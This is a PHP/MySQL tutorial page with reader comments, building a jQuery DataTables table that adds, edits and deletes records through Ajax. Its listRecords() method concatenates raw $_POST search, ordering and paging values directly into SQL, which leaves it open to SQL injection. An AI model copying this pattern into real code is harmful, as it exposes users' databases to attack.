=== Content from www.phpzag.com_cdfa05a6_20250119_134309.html ===

[Skip to main content](#content)
Toggle navigation

[PHPZAG.COM](https://www.phpzag.com/ "PHPZAG.COM")

* [Home](https://www.phpzag.com/ "Home")
* [Tutorials](https://www.phpzag.com/category/tutorials/ "Tutorials")
  + [PHP](https://www.phpzag.com/category/tutorials/php-tutorial-2/ "PHP")
  + [OOP](https://www.phpzag.com/object-oriented-programming-with-php/ "Object Oriented Programming in PHP")
  + [Laravel](https://www.phpzag.com/category/tutorials/laravel/ "Laravel")
  + [AngularJS](https://www.phpzag.com/category/tutorials/angularjs/ "AngularJS")
  + [WordPress](https://www.phpzag.com/category/tutorials/wordpress/ "Wordpress")
  + [HTML5](https://www.phpzag.com/category/tutorials/html5-tutorial/ "HTML5")
  + [Javascript](https://www.phpzag.com/category/tutorials/javascript-2/ "Javascript")
  + [JQuery](https://www.phpzag.com/category/tutorials/jquery/ "JQuery")
  + [Magento](https://www.phpzag.com/category/tutorials/magento/ "Magento")
  + [MYSQL](https://www.phpzag.com/category/tutorials/mysql/ "MYSQL")
  + [WordPress](https://www.phpzag.com/category/tutorials/wordpress/ "Wordpress")
  + [Payment Gateways](https://www.phpzag.com/category/tutorials/payment-gateways/ "Payment Gateways")
* [Live Demos](https://www.phpzag.com/php-free-script-live-demo/ "Free PHP script live demos")
* [Advertise](https://www.phpzag.com/advertise/ "Advertise")

![](https://www.phpzag.com/wp-content/uploads/2019/06/Live-Add-Edit-Delete-datatables-Records-with-PHP-and-MySQL-min-750x410.png)
# Live Add Edit Delete Datatables Records with Ajax, PHP & MySQL

 [**Last Updated:** 5 July, 20235 July, 2023](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/)  [PHPZAG Team](https://www.phpzag.com/author/phpzag/)
[PHP](https://www.phpzag.com/category/tutorials/php-tutorial-2/), [Tutorials](https://www.phpzag.com/category/tutorials/)

In our previous tutorial, we have explained how to [Create Live Editable Table with jQuery, PHP and MySQL](https://www.phpzag.com/create-live-editable-table-with-jquery-php-and-mysql/). In this tutorial, we will explain How To Implement **Live Add Edit Delete Datatables Records with Ajax, PHP & MySQL.**

DataTables is a jQuery JavaScript library to convert simple HTML table to dynamic feature rich table.

The jQuery DataTables are very user friendly to list records with live add, edit, delete records without page refresh. Due to this, DataTables used widely in web application to list records.

So if you’re thinking to use jQuery DataTables in your project, then its very easy. You can easily implement jQuery DataTables in your project with PHP and Ajax.

In this tutorial you will learn how to implement **Live Add, Edit and Delete DataTables Records with Ajax PHP and MySQL**.

Also, read:

* [Create Live Editable Table with jQuery, PHP and MySQL](https://www.phpzag.com/create-live-editable-table-with-jquery-php-and-mysql/)

We will cover this tutorial in easy steps to create live example to jQuery DataTables to list records with live add, edit and delete record functionality. You can also download complete project. The download link is located at the end of tutorial.

![](http://www.phpzag.com/wp-content/uploads/2019/06/Live-Add-Edit-Delete-datatables-Records-with-PHP-and-MySQL-min.png)

As we will cover this tutorial with live example to Live Add Edit Delete DataTables Records with Ajax, PHP & MySQL, so the major files for this example is following.

* live-add-edit-delete-datatables-php-mysql-demo
  + config
    - Database.php
  + Class
    - Records.php
  + js
    - ajax.js
  + index.php
  + ajax\_action.php

### Step1: Create MySQL Database Tables

First we will create MySQL database tables **live\_records** to add, edit and delete records.

```
CREATE TABLE `live_records` (
  `id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `skills` varchar(255) NOT NULL,
  `address` varchar(255) NOT NULL,
  `designation` varchar(255) NOT NULL,
  `age` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

ALTER TABLE `live_records`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `live_records`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

```
### Step2: List Records in DataTables

In **index.php** file, we will create Table to list records using jQuery DataTables.

```
<table id="recordListing" class="table table-bordered table-striped">
	<thead>
		<tr>
			<th>#</th>
			<th>Name</th>
			<th>Age</th>
			<th>Skills</th>
			<th>Address</th>
			<th>Designation</th>
			<th></th>
			<th></th>
		</tr>
	</thead>
</table>

```

We will initialize jQuery DataTables in **ajax.js** file and make ajax request to action **listRecords** to make server side request to fetch records to load in DataTables.

```
var dataRecords = $('#recordListing').DataTable({
		"lengthChange": false,
		"processing":true,
		"serverSide":true,
		'serverMethod': 'post',
		"order":[],
		"ajax":{
			url:"ajax_action.php",
			type:"POST",
			data:{action:'listRecords'},
			dataType:"json"
		},
		"columnDefs":[
			{
				"targets":[0, 6, 7],
				"orderable":false,
			},
		],
		"pageLength": 10
	});

```

We will call method **listRecords()** on action **listRecords** to list records.

```
$record = new Records();
if(!empty($_POST['action']) && $_POST['action'] == 'listRecords') {
	$record->listRecords();
}

```

We will create method **listRecords()** in class **Records.php** to fetch records from MySQL database and return as JSON data.

```
public function listRecords(){

	$sqlQuery = "SELECT * FROM ".$this->recordsTable." ";
	if(!empty($_POST["search"]["value"])){
		$sqlQuery .= 'where(id LIKE "%'.$_POST["search"]["value"].'%" ';
		$sqlQuery .= ' OR name LIKE "%'.$_POST["search"]["value"].'%" ';
		$sqlQuery .= ' OR designation LIKE "%'.$_POST["search"]["value"].'%" ';
		$sqlQuery .= ' OR address LIKE "%'.$_POST["search"]["value"].'%" ';
		$sqlQuery .= ' OR skills LIKE "%'.$_POST["search"]["value"].'%") ';
	}

	if(!empty($_POST["order"])){
		$sqlQuery .= 'ORDER BY '.$_POST['order']['0']['column'].' '.$_POST['order']['0']['dir'].' ';
	} else {
		$sqlQuery .= 'ORDER BY id DESC ';
	}

	if($_POST["length"] != -1){
		$sqlQuery .= 'LIMIT ' . $_POST['start'] . ', ' . $_POST['length'];
	}

	$stmt = $this->conn->prepare($sqlQuery);
	$stmt->execute();
	$result = $stmt->get_result();

	$stmtTotal = $this->conn->prepare("SELECT * FROM ".$this->recordsTable);
	$stmtTotal->execute();
	$allResult = $stmtTotal->get_result();
	$allRecords = $allResult->num_rows;

	$displayRecords = $result->num_rows;
	$records = array();
	while ($record = $result->fetch_assoc()) {
		$rows = array();
		$rows[] = $record['id'];
		$rows[] = ucfirst($record['name']);
		$rows[] = $record['age'];
		$rows[] = $record['skills'];
		$rows[] = $record['address'];
		$rows[] = $record['designation'];
		$rows[] = '<button type="button" name="update" id="'.$record["id"].'"
 class="btn btn-warning btn-xs update">Update</button>';
		$rows[] = '<button type="button" name="delete" id="'.$record["id"].'"
 class="btn btn-danger btn-xs delete" >Delete</button>';
		$records[] = $rows;
	}

	$output = array(
		"draw"	=>	intval($_POST["draw"]),
		"iTotalRecords"	=> 	$displayRecords,
		"iTotalDisplayRecords"	=>  $allRecords,
		"data"	=> 	$records
	);

	echo json_encode($output);
}

```
### Step3: Handle Add New Record

In **index.php** file, we will create Bootstrap modal to add new records to jQuery DataTables.

```
<div id="recordModal" class="modal fade">
	<div class="modal-dialog">
		<form method="post" id="recordForm">
			<div class="modal-content">
				<div class="modal-header">
					<button type="button" class="close"
data-dismiss="modal">×</button>
					<h4 class="modal-title"><i
class="fa fa-plus"></i> Add Record</h4>
				</div>
				<div class="modal-body">
					<div class="form-group"
						<label for="name" class="control-label">Name</label>
						<input type="text" class="form-control"
id="name" name="name" placeholder="Name" required>
					</div>
					<div class="form-group">
						<label for="age" class="control-label">Age</label>
						<input type="number" class="form-control"
id="age" name="age" placeholder="Age">
					</div>
					<div class="form-group">
						<label for="lastname" class="control-label">Skills</label>
						<input type="text" class="form-control"
id="skills" name="skills" placeholder="Skills" required>
					</div>
					<div class="form-group">
						<label for="address" class="control-label">Address</label>
						<textarea class="form-control"
rows="5" id="address" name="address"></textarea>
					</div>
					<div class="form-group">
						<label for="lastname" class="control-label">Designation</label>
						<input type="text" class="form-control"
id="designation" name="designation" placeholder="Designation">
					</div>
				</div>
				<div class="modal-footer">
					<input type="hidden" name="id" id="id" />
					<input type="hidden" name="action" id="action" value="" />
					<input type="submit" name="save" id="save"
class="btn btn-info" value="Save" />
					<button type="button" class="btn btn-default"
data-dismiss="modal">Close</button>
				</div>
			</div>
		</form>
	</div>
</div>

```

We will handle modal form submit using jQuery and make Ajax request with action **addRecord** to add new records.

```
$("#recordModal").on('submit','#recordForm', function(event){
	event.preventDefault();
	$('#save').attr('disabled','disabled');
	var formData = $(this).serialize();
	$.ajax({
		url:"ajax_action.php",
		method:"POST",
		data:formData,
		success:function(data){
			$('#recordForm')[0].reset();
			$('#recordModal').modal('hide');
			$('#save').attr('disabled', false);
			dataRecords.ajax.reload();
		}
	})
});

```

We will call method **addRecord()** on action **addRecord** to add new records.

```
$database = new Database();
$db = $database->getConnection();

$record = new Records($db);

if(!empty($_POST['action']) && $_POST['action'] == 'addRecord') {
	$record->name = $_POST["name"];
        $record->age = $_POST["age"];
        $record->skills = $_POST["skills"];
	$record->address = $_POST["address"];
	$record->designation = $_POST["designation"];
	$record->addRecord();
}

```

We will create method **addRecord()** in class **Records.php** to add new records into MySQL database.

```
public function addRecord(){

		if($this->name) {

			$stmt = $this->conn->prepare("
			INSERT INTO ".$this->recordsTable."(`name`, `age`, `skills`, `address`, `designation`)
			VALUES(?,?,?,?,?)");

			$this->name = htmlspecialchars(strip_tags($this->name));
			$this->age = htmlspecialchars(strip_tags($this->age));
			$this->skills = htmlspecialchars(strip_tags($this->skills));
			$this->address = htmlspecialchars(strip_tags($this->address));
			$this->designation = htmlspecialchars(strip_tags($this->designation));

			$stmt->bind_param("sisss", $this->name, $this->age, $this->skills,
$this->address, $this->designation);

			if($stmt->execute()){
				return true;
			}
		}
	}

```
### Step4: Handle Update Record

We will handle records update functionality by populating records values to update modal form by make Ajax request to action **getRecord** to load values to modal form input.

```
$("#recordListing").on('click', '.update', function(){
	var id = $(this).attr("id");
	var action = 'getRecord';
	$.ajax({
		url:'ajax_action.php',
		method:"POST",
		data:{id:id, action:action},
		dataType:"json",
		success:function(data){
			$('#recordModal').modal('show');
			$('#id').val(data.id);
			$('#name').val(data.name);
			$('#age').val(data.age);
			$('#skills').val(data.skills);
			$('#address').val(data.address);
			$('#designation').val(data.designation);
			$('.modal-title').html(" Edit Records");
			$('#action').val('updateRecord');
			$('#save').val('Save');
		}
	})
});

```

We will call method **updateRecord()** from class **Records.php** to update records.

```
$database = new Database();
$db = $database->getConnection();

$record = new Records($db);

if(!empty($_POST['action']) && $_POST['action'] == 'updateRecord') {
	$record->id = $_POST["id"];
	$record->name = $_POST["name"];
    $record->age = $_POST["age"];
    $record->skills = $_POST["skills"];
	$record->address = $_POST["address"];
	$record->designation = $_POST["designation"];
	$record->updateRecord();
}

```

We will create method **updateRecord()** in class **Records.php** to update records into MySQL database table.

```
public function updateRecord(){

		if($this->id) {

			$stmt = $this->conn->prepare("
			UPDATE ".$this->recordsTable."
			SET name= ?, age = ?, skills = ?, address = ?, designation = ?
			WHERE id = ?");

			$this->id = htmlspecialchars(strip_tags($this->id));
			$this->name = htmlspecialchars(strip_tags($this->name));
			$this->age = htmlspecialchars(strip_tags($this->age));
			$this->skills = htmlspecialchars(strip_tags($this->skills));
			$this->address = htmlspecialchars(strip_tags($this->address));
			$this->designation = htmlspecialchars(strip_tags($this->designation));

			$stmt->bind_param("sisssi", $this->name, $this->age, $this->skills, $this->address, $this->designation, $this->id);

			if($stmt->execute()){
				return true;
			}

		}
	}

```
### Step5: Handle Delete Records

We will handle records delete functionality by making ajax request with action **deleteRecord** to delete record from MySQL database table.

```
$("#recordListing").on('click', '.delete', function(){
	var id = $(this).attr("id");
	var action = "deleteRecord";
	if(confirm("Are you sure you want to delete this record?")) {
		$.ajax({
			url:"ajax_action.php",
			method:"POST",
			data:{id:id, action:action},
			success:function(data) {
				dataRecords.ajax.reload();
			}
		})
	} else {
		return false;
	}
});

```

We will call method **deleteRecord()** from class **Records.php** on action **deleteRecord** to delete records.

```
$database = new Database();
$db = $database->getConnection();

$record = new Records($db);

if(!empty($_POST['action']) && $_POST['action'] == 'deleteRecord') {
	$record->id = $_POST["id"];
	$record->deleteRecord();
}

```

We will create method **deleteRecord()** in class **Records.php** to delete records into MySQL database table.

```
public function deleteRecord(){
		if($this->id) {

			$stmt = $this->conn->prepare("
				DELETE FROM ".$this->recordsTable."
				WHERE id = ?");

			$this->id = htmlspecialchars(strip_tags($this->id));

			$stmt->bind_param("i", $this->id);

			if($stmt->execute()){
				return true;
			}
		}
	}

```

You may also like:

* [Build Live Chat System with Ajax, PHP & MySQL](https://www.phpzag.com/build-live-chat-system-with-ajax-php-mysql/)
* [Create Event Calendar with jQuery, PHP and MySQL](https://www.phpzag.com/create-event-calendar-with-jquery-php-and-mysql/)
* [Build Invoice System with PHP & MySQL](https://www.phpzag.com/build-invoice-system-with-php-mysql/)
* [Push Notification System with PHP & MySQL](https://www.phpzag.com/push-notification-system-with-php-mysql/)
* [Create Bootstrap Cards with PHP and MySQL](https://www.phpzag.com/create-bootstrap-cards-with-php-and-mysql/)
* [Build Content Management System with PHP & MySQL](https://www.phpzag.com/build-content-management-system-with-php-mysql/)
* [Convert Unix Timestamp To Readable Date Time in PHP](https://www.phpzag.com/convert-unix-timestamp-to-readable-date-time-in-php/)
* [Ajax Drop Down Selection Data Load with PHP & MySQL](https://www.phpzag.com/ajax-drop-down-selection-data-load-with-php-mysql/)
* [Inventory Management System with Ajax, PHP & MySQL](https://www.phpzag.com/build-inventory-system-with-ajax-php-mysql/)
* [Drag and Drop File Upload using jQuery and PHP](https://www.phpzag.com/drag-and-drop-file-upload-using-jquery-and-php/)
* [Load Dynamic Content in Bootstrap Popover with Ajax, PHP & MySQL](https://www.phpzag.com/load-dynamic-content-in-bootstrap-popover-with-ajax-php-mysql/)

You can view the live demo from the Demo link and can download the full script from the Download link below.

## 67 thoughts on “Live Add Edit Delete Datatables Records with Ajax, PHP & MySQL”

1. ![](https://secure.gravatar.com/avatar/b7617a4665e48fef891c328f9dae43d8?s=60&d=mm&r=g) **Lakshmi Narasimha Ahish Kovalam** says:
   [25 July, 2019 at 2:44 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-161904)

   I am trying to do same thing on my application. I find issues. Can I have someone to help me?

   [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=161904#respond)
   1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
      [28 July, 2019 at 6:25 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-161946)

      Please send your code to fix issues. thanks!

      [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=161946#respond)
      1. ![](https://secure.gravatar.com/avatar/01010f02b1e6ad2b6150b591b2214f8b?s=60&d=mm&r=g) **work** says:
         [11 September, 2019 at 10:34 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-163248)

         Please the pagination and tri doesn’t work?

         [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=163248#respond)
         1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
            [29 September, 2019 at 2:48 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-163579)

            You need to use “paging”: true, option for pagination when initialize datatables. thanks!

            [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=163579#respond)
            1. ![](https://secure.gravatar.com/avatar/646e69244e435a0a258cd011cdf9f845?s=60&d=mm&r=g) **peter** says:
               [12 November, 2019 at 8:21 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-164427)

               it show previous next but cannot move next or previous.
            3. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
               [24 November, 2019 at 1:47 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-164574)

               I have fixed the pagination issues. You can download the zip file. thanks!
3. ![](https://secure.gravatar.com/avatar/de2133107c7ff582ee61f667efb64e1b?s=60&d=mm&r=g) **Nancy** says:
   [22 September, 2019 at 1:52 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-163434)

   Good job Sir. Excellent tutorials

   [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=163434#respond)
5. ![](https://secure.gravatar.com/avatar/5708329702ca5a1067cf69e08331141a?s=60&d=mm&r=g) **zxxlot** says:
   [24 September, 2019 at 11:38 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-163467)

   Previousnext buttons not working, please.

   [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=163467#respond)
   1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
      [29 September, 2019 at 2:34 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-163568)

      You need to use “paging”: true, option for pagination when initialize datatables. thanks!

      [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=163568#respond)
      1. ![](https://secure.gravatar.com/avatar/5dddf227e9f7c5adafdb41d13f52f729?s=60&d=mm&r=g) **Robin** says:
         [23 November, 2019 at 3:29 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-164525)

         I have tried “paging”: true, not working

         [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=164525#respond)
         1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
            [24 November, 2019 at 1:45 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-164573)

            I have updated the tutorial with all issue fix with pagination. You can download the zip file. Thanks!

            [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=164573#respond)
7. ![](https://secure.gravatar.com/avatar/b744ead2c4165e295a84252e28d95678?s=60&d=mm&r=g) **Sanjeev** says:
   [10 October, 2019 at 11:31 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-163924)

   Hi,

   Unable to find the download code.

   [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=163924#respond)
   1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
      [20 October, 2019 at 8:30 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-164165)

      its at the end of tutorial. thanks!

      [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=164165#respond)
9. ![](https://secure.gravatar.com/avatar/b5f107c9d92e6b7c5527eea690c5bfe7?s=60&d=mm&r=g) **PJ Simoes** says:
   [28 October, 2019 at 7:18 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-164292)

   Thanks!!! A great Tutorial!!!

   Can u explain how to handle with column order if I add more columns?

   The table became instable…

   [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=164292#respond)
   1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
      [24 November, 2019 at 1:52 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-164576)

      You need to handle when initialize DataTables in ajax.js file to modify order in columnDefs option. Thanks.

      [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=164576#respond)
11. ![](https://secure.gravatar.com/avatar/646e69244e435a0a258cd011cdf9f845?s=60&d=mm&r=g) **peter** says:
    [12 November, 2019 at 7:58 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-164425)

    how to set mysqli charset for this.

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=164425#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [24 November, 2019 at 1:50 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-164575)

       I have fixed issues and updated the tutorial. you can download the updated code. thanks!

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=164575#respond)
    3. ![](https://secure.gravatar.com/avatar/88abb0cf630b1303f7c9b35d3aefee23?s=60&d=mm&r=g) **Tamas SZUCS** says:
       [18 April, 2021 at 3:28 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-171844)

       Hi,

       Did you find the way?

       I have issu with accent charachters and cant solve it by myself.

       I would apprichiate any help!

       Thanks!

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=171844#respond)
13. ![](https://secure.gravatar.com/avatar/2162a161dfb12aaccadb09b79e6fe78e?s=60&d=mm&r=g) **SHARAD KUMAR** says:
    [27 November, 2019 at 2:09 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-164614)

    I tried changing the database to my own database and also changed the variable but now i am getting the error Invalid JSON response.

    Any fix to this?

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=164614#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [4 December, 2019 at 3:57 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-164650)

       May there will be issue to get data from MySQL database table. Try to debug line by line to know the exact issue. thanks!

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=164650#respond)
       1. ![](https://secure.gravatar.com/avatar/233f3f51fadd3d77e88295a6fa0f05c8?s=60&d=mm&r=g) **VJM Daniels** says:
          [24 November, 2020 at 5:45 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-169446)

          I am getting the same error – only thing I did is change the name of the database in Database.php. Did you find the solution?

          [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=169446#respond)
          1. ![](https://secure.gravatar.com/avatar/233f3f51fadd3d77e88295a6fa0f05c8?s=60&d=mm&r=g) **VJM Daniels** says:
             [24 November, 2020 at 6:01 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-169447)

             Found it – I had to change the database user ” root” to the database name (I have no direct root access)

             [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=169447#respond)
15. ![](https://secure.gravatar.com/avatar/fd11f5929888b0f84e045cb278a94bf1?s=60&d=mm&r=g) **Vasilis** says:
    [24 February, 2020 at 7:43 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-165587)

    Hi,

    the table is quite usefull, everything worked just fine for me!

    But,

    1. how can i set the table to auto-fill the whole width of my monitor?

    2. how can i set a fixed width for the table columns?

    Thanks in advance,

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=165587#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [28 March, 2020 at 5:34 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-165855)

       You can check the jQuert Datatable documentation or this. thanks!

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=165855#respond)
17. ![](https://secure.gravatar.com/avatar/64256ce59fa39d3ede9cb4a6ae970b07?s=60&d=mm&r=g) **John C,** says:
    [22 March, 2020 at 6:04 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-165797)

    Can’t unlock the download. No matter how many times I click on the facebook like.

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=165797#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [28 March, 2020 at 5:29 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-165850)

       I have just checked and its working. please try again or if issue try to reload page and the download link will be displayed. thanks!

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=165850#respond)
19. ![](https://secure.gravatar.com/avatar/37bf00e304b5774fb8f2d0bb32bdf3ff?s=60&d=mm&r=g) **Gianpierre** says:
    [28 April, 2020 at 7:55 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-166307)

    I want to put a new field, but when I put it it doesn’t pull me, and I added in the index php a text called effect and in the file records.php in the function addRecord () and put the following line $ this-> effect = htmlspecialchars (strip\_tags ($ this-> effect));

    INSERT INTO “. $ This-> recordsTable.” (`Name`,` age`, `skills`,` address`, `designation`,` effect`)

    VALUES (?,?,?,?,?,?) “And $ stmt-> bind\_param (” sisss “, $ this-> name, $ this-> age, $ this-> skills, $ this-> address, $ this-> designation, $ this-> effect);

    but it doesn’t run

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=166307#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [16 May, 2020 at 6:40 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-166487)

       $stmt-> bind\_param (” sisss “, $ this-> name, $ this-> age, $ this-> skills, $ this-> address, $ this-> designation, $ this-> effect);

       Please add “s” to bind param at end because the “effect” field is string. if it is numeric, then you need to add “i”. It should be like this:

       $stmt-> bind\_param (” sissss “, $ this-> name, $ this-> age, $ this-> skills, $ this-> address, $ this-> designation, $ this-> effect);

       thanks!

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=166487#respond)
21. ![](https://secure.gravatar.com/avatar/95516214b37b0c9689206952df09325c?s=60&d=mm&r=g) **eric zam** says:
    [15 May, 2020 at 3:52 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-166470)

    I would like to send a variable to function listRecords , so that it will only shows rows from that value

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=166470#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [16 May, 2020 at 6:36 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-166484)

       You can easily handle this, thanks!

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=166484#respond)
23. ![](https://secure.gravatar.com/avatar/0748e4fac708b824d7f8d73cdb59a805?s=60&d=mm&r=g) **Miracle** says:
    [18 June, 2020 at 1:28 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-166883)

    Edit is not working on my localhost but work on your demo

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=166883#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [21 June, 2020 at 6:31 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-166916)

       Try to debug to know the exact cause of issue, may be there error that causing issue. Thanks!

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=166916#respond)
25. ![](https://secure.gravatar.com/avatar/766e3940e4885caf139c3cf45166e484?s=60&d=mm&r=g) **Hany** says:
    [29 October, 2020 at 11:50 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-169097)

    You guys provide great tutorials, however this one is a little harder to follow when making changes due of name of table (records) which I want to change to admin and changed field/variables names and added an additional one.

    I almost have it working but just cant seem to get it working correctly, would you please have a look at my changes and make fix for me, it should be a minor fix. Thanks in advance.

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=169097#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [21 November, 2020 at 10:56 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-169393)

       Yes, provide more details to help you. thanks!

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=169393#respond)
27. ![](https://secure.gravatar.com/avatar/766e3940e4885caf139c3cf45166e484?s=60&d=mm&r=g) **Hany** says:
    [15 November, 2020 at 12:48 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-169305)

    I am having difficulty passing variable from 1 page to another with list.

    I have copied the 4 files (php and ajax), renamed them and made my changes. It works correctly.

    I created and extra button in your files passing the group\_id to next page. This part works.

